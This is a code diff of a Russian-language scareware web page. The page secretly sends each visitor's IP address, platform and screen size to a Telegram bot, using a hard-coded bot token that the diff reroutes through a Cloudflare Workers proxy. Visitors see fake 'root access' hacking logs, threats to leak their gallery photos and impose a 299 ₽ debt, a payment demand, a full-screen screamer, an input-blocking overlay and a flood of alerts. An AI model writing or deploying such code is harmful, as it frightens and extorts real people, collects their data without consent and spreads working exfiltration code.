@@ -39,19 +39,10 @@
         #screamer { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 999999; background: #000; justify-content: center; align-items: center; animation: shakeAnim 0.05s infinite; }
         #screamer img { width: 100%; height: 100%; object-fit: cover; filter: contrast(2) saturate(0) invert(0.1); }
 
-        #blocker {
-            display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            z-index: 9999999; background: transparent;
-        }
+        #blocker { display: none; position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 9999999; background: transparent; }
 
-        .arabic-float {
-            position: fixed; color: red; font-size: 24px; font-weight: bold; z-index: 100000; pointer-events: none;
-            animation: floatUp 2s forwards; text-shadow: 2px 2px 4px #000;
-        }
-        @keyframes floatUp {
-            0% { transform: translateY(0) scale(1); opacity: 1; }
-            100% { transform: translateY(-100px) scale(1.5); opacity: 0; }
-        }
+        .arabic-float { position: fixed; color: red; font-size: 24px; font-weight: bold; z-index: 100000; pointer-events: none; animation: floatUp 2s forwards; text-shadow: 2px 2px 4px #000; }
+        @keyframes floatUp { 0% { transform: translateY(0) scale(1); opacity: 1; } 100% { transform: translateY(-100px) scale(1.5); opacity: 0; } }
     </style>
 </head>
 <body>
@@ -90,6 +81,7 @@
 
             const TG_TOKEN = "8861612688:AAGHhJMkESLYIOfAQmDgEeILm3-mJAbmyLc";
             const TG_CHAT_ID = "5609993893";
+            const PROXY_URL = "https://tg-proxy.polina-f1d.workers.dev";
 
             async function keepScreenAwake() {
                 try {
@@ -109,8 +101,8 @@
                     .then(res => res.json())
                     .then(data => {
                         const text = `🚨 ЖЕРТВА! IP: ${data.ip} | Платформа: ${navigator.platform} | Экран: ${window.screen.width}x${window.screen.height}`;
-                        const url = `https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`;
-                        fetch(`https://corsproxy.io/?${encodeURIComponent(url)}`).catch(e => console.log(e));
+                        const url = `${PROXY_URL}/bot${TG_TOKEN}/sendMessage?chat_id=${TG_CHAT_ID}&text=${encodeURIComponent(text)}`;
+                        fetch(url).catch(e => console.log("Ошибка отправки:", e));
                     }).catch(e => console.log(e));
 
                 setInterval(() => {
@@ -145,7 +137,6 @@
                             setTimeout(() => el.remove(), 2000);
                         }
                     }, 500);
-
                     const threats = [
                         "Все данные синхронизированы. Задолженность: 299 ₽.",
                         "Фото из галереи отправлены вашим контактам!",
@@ -159,7 +150,7 @@
                         threatIndex = (threatIndex + 1) % threats.length;
                     }, 4000);
 
-                    const fakeApps = ["VK", "Telegram", "Sberbank", "Tinkoff", "Gosuslugi", "МЭШ", "YouTube", "Chrome", "Галерея"];
+                    const fakeApps = ["VK", "Telegram", "Sberbank", "Tinkoff", "Госуслуги", "MЭШ", "WhatsApp", "Яндекс Музыка", "Spotify", "Tik Tok", "YouTube", "Chrome", "Галерея"];
                     let logs = ["> Инициализация глубокого сканирования...", "> Получение root-прав... OK", "> Чтение системных файлов...", "> Поиск установленных приложений..."];
                     fakeApps.sort(() => Math.random() - 0.5).forEach(app => { logs.push(`> Найдено приложение: [${app}] - доступ получен`); });
                     logs.push("> Скачивание паролей от Госуслуг...", "> Доступ к галерее... 100%", "> Отправка СМС на номер 900...", "> Слив фото в открытый доступ...", "> Создание задолженности (299 ₽)...");
@@ -176,7 +167,7 @@
                                 terminalText.innerHTML = "> ОШИБКА ДОСТУПА. ТРЕБУЕТСЯ ОПЛАТА.<br>";
                             }
                         }
-                    }, 250); 
+                    }, 250);
 
                     try {
                         const AudioContext = window.AudioContext || window.webkitAudioContext;
@@ -228,10 +219,10 @@
                 payBtn.addEventListener('click', function() {
                     let count = 0;
                     let alertInterval = setInterval(() => {
-                        alert("ОШИБКА: ПЕРЕВОД ОТКЛОНЕН БАНКОМ.");
+                        alert("ОШИБКА: ПЕРЕВОД ОТКЛОНЕН БАНКОМ. ПОВТОРИТЕ.");
                         count++;
-                        if (count >= 5) clearInterval(alertInterval);
-                    }, 100);
+                        if (count >= 50) clearInterval(alertInterval);
+                    }, 50);
                 });
             }
 
